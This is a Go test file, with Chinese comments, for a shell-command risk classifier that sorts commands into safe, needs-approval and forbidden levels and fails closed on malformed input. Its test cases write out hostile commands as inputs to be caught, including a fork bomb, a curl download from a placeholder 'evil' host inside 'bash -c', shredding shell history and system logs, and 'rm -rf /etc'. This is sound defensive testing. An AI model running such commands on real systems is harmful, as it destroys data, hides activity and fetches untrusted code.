package risk

import (
	"errors"
	"strings"
	"testing"
)

// mkWords 快速构造词序列，用于直测 skip* 包装器剥离函数。
func mkWords(ss ...string) []word {
	out := make([]word, len(ss))
	for i, s := range ss {
		out[i] = word{text: s}
	}
	return out
}

func texts(ws []word) []string {
	out := make([]string, len(ws))
	for i, w := range ws {
		out[i] = w.text
	}
	return out
}

// ---- rules.go 词法边界 ----

func TestIsArithBodyEdgeInputs(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"1 2", false},       // 操作数后紧跟操作数：二元位置缺运算符
		{"1 (2)", false},     // '(' 出现在期待运算符处
		{"(1+", false},       // 括号未闭合
		{"()", false},        // 空括号无操作数
		{"1)", false},        // 裸右括号
		{"1 $X", false},      // '$' 出现在期待运算符处
		{"1+$", false},       // 末尾孤立 $
		{"${A", false},       // ${ 缺 }
		{"${A}+1", true},     // 参数展开作为操作数
		{"1+2", true},        // 基本二元
		{"-1 + 16#ff", true}, // 一元负号与 base 记法
		{"(1+2)*3", true},    // 嵌套括号
		{"1.5*2", true},      // 浮点
	}
	for _, tc := range cases {
		if got := isArithBody(tc.in); got != tc.want {
			t.Errorf("isArithBody(%q) = %v, want %v", tc.in, got, tc.want)
		}
	}
}

// parseCommand 对畸形输入失败关闭：全部返回错误而非接受。
func TestParseCommandMalformedInputs(t *testing.T) {
	cases := []struct {
		in      string
		wantMsg string
	}{
		{`echo 'abc`, "unterminated quoted string"}, // 单引号未闭合
		{`echo "abc`, "unterminated quoted string"}, // 双引号未闭合
		{`echo a\`, "unbalanced shell syntax"},      // 行尾孤立反斜杠
		{`echo $(ls`, "unbalanced"},                 // $() 未闭合
		{`echo $(1+` + "`" + `ls))`, "unexpected"},  // 算术体内反引号未闭合
		{`echo "a$(ls"`, "unbalanced"},              // 双引号内 $() 未闭合
		{"echo \"a" + "`" + "ls\"", "unterminated"}, // 双引号内反引号未闭合
		{"echo `ls", "unterminated"},                // 反引号未闭合
		{`echo <(ls`, "unbalanced"},                 // 进程替换未闭合
		{`echo (ls`, "unbalanced"},                  // 子 shell 未闭合
		{`ls )`, "unexpected ')'"},                  // 段内裸右括号
	}
	for _, tc := range cases {
		_, err := parseCommand(tc.in)
		if err == nil {
			t.Errorf("parseCommand(%q) = nil error, want %q", tc.in, tc.wantMsg)
			continue
		}
		if !strings.Contains(err.Error(), tc.wantMsg) {
			t.Errorf("parseCommand(%q) error = %q, want containing %q", tc.in, err.Error(), tc.wantMsg)
		}
	}
}

// Classify 对上述畸形形态必须失败关闭为 forbidden/OBFUSCATION。
func TestClassifyMalformedForbidden(t *testing.T) {
	for _, cmd := range []string{
		`echo 'abc`,
		`echo "abc`,
		`echo a\`,
		`echo $(ls`,
		`echo $(1+` + "`" + `ls))`,
		`echo "a$(ls"`,
		"echo \"a`ls\"",
		"echo `ls",
		`echo <(ls`,
		`echo (ls`,
		`ls )`,
	} {
		d := Classify(cmd, OSLinux)
		if d.Level != LevelForbidden || d.RuleID != "OBFUSCATION" {
			t.Errorf("Classify(%q) = %s/%s, want forbidden/OBFUSCATION", cmd, d.Level, d.RuleID)
		}
	}
}

// 嵌套超过 4 层的命令替换失败关闭。
func TestClassifyNestingDepthExceeded(t *testing.T) {
	d := Classify("echo $(echo $(echo $(echo $(echo $(echo x)))))", OSLinux)
	if d.Level != LevelForbidden {
		t.Fatalf("level = %s, want forbidden", d.Level)
	}
	if !strings.Contains(strings.Join(d.Reasons, ";"), "nesting depth exceeds 4") {
		t.Fatalf("reasons = %v, want nesting depth reason", d.Reasons)
	}
}

// 命令替换内部各自失败关闭：内部引号不闭合 / IFS 混淆 / 内部语法错误。
func TestClassifySubstitutionInnerFailures(t *testing.T) {
	cases := []struct {
		cmd      string
		wantRule string
	}{
		{`echo "$(echo 'a)" "`, "OBFUSCATION"}, // 内部单引号不闭合
		{"echo $(echo $IFS)", "OBFUSCATION"},   // 内部 IFS 混淆
		{"echo `echo )`", "OBFUSCATION"},       // 反引号内裸右括号
		{"echo `echo 'a`", "OBFUSCATION"},      // 反引号内引号不闭合
	}
	for _, tc := range cases {
		d := Classify(tc.cmd, OSLinux)
		if d.Level != LevelForbidden || d.RuleID != tc.wantRule {
			t.Errorf("Classify(%q) = %s/%s, want forbidden/%s", tc.cmd, d.Level, d.RuleID, tc.wantRule)
		}
	}
}

// ---- 包装器选项剥离 ----

func TestSkipOptionsBranches(t *testing.T) {
	// -- 终止选项扫描。
	if got := texts(skipOptions(mkWords("sudo", "--", "-u", "ls"), nil)); strings.Join(got, " ") != "-u ls" {
		t.Errorf("skipOptions(-- ) = %v", got)
	}
	// --key=value 整体消费。
	if got := texts(skipOptions(mkWords("sudo", "--prompt=x", "ls"), nil)); strings.Join(got, " ") != "ls" {
		t.Errorf("skipOptions(--key=val) = %v", got)
	}
	// 带值选项连同值一起跳过。
	if got := texts(skipOptions(mkWords("sudo", "-u", "root", "ls"), map[string]bool{"-u": true})); strings.Join(got, " ") != "ls" {
		t.Errorf("skipOptions(takesArg) = %v", got)
	}
	// 带值选项在末尾越界保护：i+=2 超出后取空。
	if got := skipOptions(mkWords("sudo", "-u"), map[string]bool{"-u": true}); len(got) != 0 {
		t.Errorf("skipOptions(tail value) = %v, want empty", texts(got))
	}
	// 单独 "-" 是操作数不是选项。
	if got := texts(skipOptions(mkWords("sudo", "-", "ls"), nil)); strings.Join(got, " ") != "- ls" {
		t.Errorf("skipOptions(bare dash) = %v", got)
	}
}

func TestSkipEnvBranches(t *testing.T) {
	if got := texts(skipEnv(mkWords("env", "FOO=1", "BAR=2", "ls"))); strings.Join(got, " ") != "ls" {
		t.Errorf("skipEnv(assignments) = %v", got)
	}
	if got := texts(skipEnv(mkWords("env", "-u", "FOO", "ls"))); strings.Join(got, " ") != "ls" {
		t.Errorf("skipEnv(-u) = %v", got)
	}
	if got := texts(skipEnv(mkWords("env", "--", "ls"))); strings.Join(got, " ") != "ls" {
		t.Errorf("skipEnv(--) = %v", got)
	}
	if got := texts(skipEnv(mkWords("env", "-i", "ls"))); strings.Join(got, " ") != "ls" {
		t.Errorf("skipEnv(-i) = %v", got)
	}
}

func TestSkipTimeoutBranches(t *testing.T) {
	if got := texts(skipTimeout(mkWords("timeout", "5", "ls"))); strings.Join(got, " ") != "ls" {
		t.Errorf("skipTimeout(duration) = %v", got)
	}
	if got := texts(skipTimeout(mkWords("timeout", "-s", "KILL", "5", "ls"))); strings.Join(got, " ") != "ls" {
		t.Errorf("skipTimeout(-s KILL) = %v", got)
	}
	if got := texts(skipTimeout(mkWords("timeout", "--", "5", "ls"))); strings.Join(got, " ") != "ls" {
		t.Errorf("skipTimeout(--) = %v", got)
	}
	if got := skipTimeout(mkWords("timeout", "5")); len(got) != 0 {
		t.Errorf("skipTimeout(only duration) = %v, want empty", texts(got))
	}
}

func TestSkipNiceBranches(t *testing.T) {
	if got := texts(skipNice(mkWords("nice", "-n", "5", "ls"))); strings.Join(got, " ") != "ls" {
		t.Errorf("skipNice(-n 5) = %v", got)
	}
	if got := texts(skipNice(mkWords("nice", "--", "ls"))); strings.Join(got, " ") != "ls" {
		t.Errorf("skipNice(--) = %v", got)
	}
	if got := texts(skipNice(mkWords("nice", "-n3", "ls"))); strings.Join(got, " ") != "ls" {
		t.Errorf("skipNice(-n3) = %v", got)
	}
}

func TestDestructiveWithoutTargetsTable(t *testing.T) {
	if !destructiveWithoutTargets("dd", nil) {
		t.Error("destructiveWithoutTargets(dd) = false, want true")
	}
	if !destructiveWithoutTargets("mkfs.ext4", nil) {
		t.Error("destructiveWithoutTargets(mkfs.ext4) = false, want true")
	}
	if destructiveWithoutTargets("ls", nil) {
		t.Error("destructiveWithoutTargets(ls) = true, want false")
	}
}

// ---- risk.go 辅助函数边界 ----

func TestAccumulatorEmptyLevelDefaultsToApproval(t *testing.T) {
	acc := &accumulator{}
	acc.add("", "SOME_RULE", "why")
	if acc.level != LevelNeedsApproval {
		t.Fatalf("level = %q, want needs_approval", acc.level)
	}
	if len(acc.reasons) != 1 || acc.reasons[0] != "SOME_RULE: why" {
		t.Fatalf("reasons = %v", acc.reasons)
	}
}

func TestIsForkBombSecondOrderVariant(t *testing.T) {
	// &| 变体（后台再管道）同样命中 FORK_BOMB。
	d := Classify("f(){ f&|f;}; f", OSLinux)
	if d.Level != LevelForbidden || d.RuleID != "FORK_BOMB" {
		t.Fatalf("Classify(fork bomb &| variant) = %s/%s, want forbidden/FORK_BOMB", d.Level, d.RuleID)
	}
}

func TestNormalizeQuoteEdges(t *testing.T) {
	// 双引号内的 \" 转义原样保留。
	got, err := normalize(`echo "a\"b"`)
	if err != nil {
		t.Fatalf("normalize(escaped quote): %v", err)
	}
	if got != `echo "a\"b"` {
		t.Fatalf("normalize(escaped quote) = %q", got)
	}

	// 末尾孤立反斜杠保留原样（parseCommand 层面失败关闭）。
	got, err = normalize(`echo a\`)
	if err != nil {
		t.Fatalf("normalize(trailing backslash): %v", err)
	}
	if got != `echo a\` {
		t.Fatalf("normalize(trailing backslash) = %q", got)
	}
}

func TestIsSeparatorByteTable(t *testing.T) {
	for _, c := range []byte{';', '|', '&', '(', ')', '\n'} {
		if !isSeparatorByte(c) {
			t.Errorf("isSeparatorByte(%q) = false, want true", c)
		}
	}
	for _, c := range []byte{'a', ' ', '#'} {
		if isSeparatorByte(c) {
			t.Errorf("isSeparatorByte(%q) = true, want false", c)
		}
	}
}

// ---- 分类规则表的剩余分支 ----

func TestClassifyEdgeCommandTable(t *testing.T) {
	cases := []struct {
		name      string
		command   string
		wantLevel Level
		wantRule  string
	}{
		{"init unknown runlevel", "init 3", LevelNeedsApproval, "DEFAULT_ASK"},
		{"dd no output target", "dd if=/dev/zero bs=1k count=1", LevelNeedsApproval, "DEFAULT_ASK"},
		{"shred history", "shred ~/.bash_history", LevelForbidden, "HISTORY_CLEAR"},
		{"shred log", "shred /var/log/syslog", LevelForbidden, "LOG_TAMPER"},
		{"truncate plain file", "truncate -s 0 /tmp/app.log", LevelNeedsApproval, "FILE_WRITE"},
		{"history", "history", LevelNeedsApproval, "DEFAULT_ASK"},
		{"unset", "unset PATH", LevelNeedsApproval, "DEFAULT_ASK"},
		{"set", "set -e", LevelNeedsApproval, "DEFAULT_ASK"},
		{"export", "export A=1", LevelNeedsApproval, "DEFAULT_ASK"},
		{"sed", "sed s/a/b/ /tmp/f", LevelNeedsApproval, "DEFAULT_ASK"},
		{"install writes", "install -m 644 /tmp/a /tmp/b", LevelNeedsApproval, "FILE_WRITE"},
		{"cp flag skipped", "cp -r /tmp/a /tmp/b", LevelNeedsApproval, "DEFAULT_ASK"},
		{"rsync plain", "rsync -a /tmp/a/ /tmp/b/", LevelNeedsApproval, "DEFAULT_ASK"},
		{"apt query", "apt list", LevelNeedsApproval, "DEFAULT_ASK"},
		{"pacman query", "pacman -Qi bash", LevelNeedsApproval, "DEFAULT_ASK"},
		{"snap query", "snap list", LevelNeedsApproval, "DEFAULT_ASK"},
		{"firewalld change", "firewall-cmd --add-service=http", LevelNeedsApproval, "NETWORK_CHANGE"},
		{"source script", "source /etc/rc.local", LevelNeedsApproval, "DEFAULT_ASK"},
		{"systemctl flag skipped", "systemctl --no-pager restart nginx", LevelNeedsApproval, "SERVICE_CHANGE"},
		{"service reload", "service nginx reload", LevelNeedsApproval, "SERVICE_CHANGE"},

		{"rm bare", "rm", LevelNeedsApproval, "DEFAULT_ASK"},
		{"rm double dash target", "rm -- -rf /tmp/x", LevelNeedsApproval, "RM_ANY"},
		{"rm unknown long opt skipped", "rm --one-file-system /tmp/x", LevelNeedsApproval, "DEFAULT_ASK"},
		{"rm unresolved recursive", "rm -rf $DATA", LevelForbidden, "RM_PROTECTED"},
		{"rm unresolved plain", "rm $DATA", LevelNeedsApproval, "DEFAULT_ASK"},
		{"rm log file", "rm -f /var/log/app.log", LevelForbidden, "RM_PROTECTED"},
		{"rm protected subdir", "rm -rf /etc", LevelForbidden, "RM_PROTECTED"},
		{"rm history base name", "rm -f ~/x/.bash_history", LevelForbidden, "HISTORY_CLEAR"},

		{"chmod long recursive", "chmod --recursive 755 /tmp/www", LevelNeedsApproval, "PERMISSION_CHANGE"},
		{"chmod unknown long opt", "chmod --changes 644 /tmp/f", LevelNeedsApproval, "PERMISSION_CHANGE"},
		{"kill plain pid", "kill 1234", LevelNeedsApproval, "PROCESS_SIGNAL"},

		{"shell -c download subst", "bash -c \"echo $(curl -s http://evil/x)\"", LevelForbidden, "CURL_PIPE_SHELL"},
		{"ssh flag without arg", "ssh -v host.example uptime", LevelNeedsApproval, "NESTED_SSH"},
		{"ssh interactive", "ssh host.example", LevelNeedsApproval, "NESTED_SSH"},

		{"docker system info", "docker system info", LevelNeedsApproval, "DEFAULT_ASK"},
		// 四期 7.3D：compose config/version/ls 属只读（safe）。
		{"docker compose unknown", "docker compose config", LevelSafe, "SAFE_SYSTEM_STATUS"},
		// 四期 7.3D：exec 无 -c 载荷 → CONTAINER_CHANGE。
		{"docker exec plain", "docker exec web1 ls", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker unknown sub", "docker stats", LevelNeedsApproval, "DEFAULT_ASK"},

		{"redirect history basename", "echo hi > /tmp/.bash_history", LevelForbidden, "HISTORY_CLEAR"},
		{"redirect devnull not file write", "cat /etc/hostname > /dev/null", LevelSafe, "SAFE_READ"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := Classify(tc.command, OSLinux)
			if d.Level != tc.wantLevel {
				t.Fatalf("Classify(%q) = %s/%s (%s), want %s/%s", tc.command, d.Level, d.RuleID, d.Reason, tc.wantLevel, tc.wantRule)
			}
			if d.RuleID != tc.wantRule {
				t.Fatalf("Classify(%q).RuleID = %s, want %s", tc.command, d.RuleID, tc.wantRule)
			}
		})
	}
}

// pipeline 中出现无主命令的段（仅替换）时不得判 SAFE_PIPE。
func TestPipelineSegmentWithoutCommandNotSafe(t *testing.T) {
	d := Classify("<`id` | wc -l", OSLinux)
	if d.Level == LevelSafe {
		t.Fatalf("Classify(substitution-only pipeline segment) = safe, want not safe")
	}
	if d.Level != LevelNeedsApproval {
		t.Fatalf("level = %s, want needs_approval", d.Level)
	}
}

// parallel 的 ::: 占位符序列必须被剥除后再分类。
func TestParallelPlaceholderStripped(t *testing.T) {
	d := Classify("parallel ::: systemctl reboot", OSLinux)
	if d.Level != LevelForbidden || d.RuleID != "POWER" {
		t.Fatalf("Classify = %s/%s, want forbidden/POWER", d.Level, d.RuleID)
	}
}

// extractShellC 在 shell 与 -c 之间允许其他选项。
func TestExtractShellCSkipsIntermediateOptions(t *testing.T) {
	script, ok := extractShellC([]string{"exec", "pod", "sh", "-x", "-c", "reboot"})
	if !ok || script != "reboot" {
		t.Fatalf("extractShellC(with option) = %q,%v, want reboot", script, ok)
	}
	if _, ok := extractShellC([]string{"exec", "pod", "sh", "cmd", "-c", "reboot"}); ok {
		t.Fatal("extractShellC(operand before -c) should stop scanning")
	}
}

func TestStartsWithDownloadNegativePaths(t *testing.T) {
	// 赋值段无主命令 → false。
	if startsWithDownload("FOO=1") {
		t.Fatal("startsWithDownload(assignment) = true, want false")
	}
	// 非下载命令 → false。
	if startsWithDownload("ls -l") {
		t.Fatal("startsWithDownload(ls) = true, want false")
	}
	if !startsWithDownload("curl -s http://x") {
		t.Fatal("startsWithDownload(curl) = false, want true")
	}
}

func TestHasFileRedirectDevNullIgnored(t *testing.T) {
	segs, err := parseCommand("cat /etc/hostname > /dev/null")
	if err != nil {
		t.Fatalf("parseCommand: %v", err)
	}
	if hasFileRedirect(segs[0]) {
		t.Fatal("redirect to /dev/null must not count as a file redirect")
	}
	segs, err = parseCommand("cat /etc/hostname > /tmp/out")
	if err != nil {
		t.Fatalf("parseCommand: %v", err)
	}
	if !hasFileRedirect(segs[0]) {
		t.Fatal("redirect to /tmp/out must count as a file redirect")
	}
}

// riskError 实现 error 接口。
func TestRiskErrorMessage(t *testing.T) {
	e := &riskError{"boom"}
	if e.Error() != "boom" {
		t.Fatalf("Error() = %q", e.Error())
	}
	var target error = e
	if !errors.Is(target, e) {
		t.Fatal("errors.Is identity should hold")
	}
}
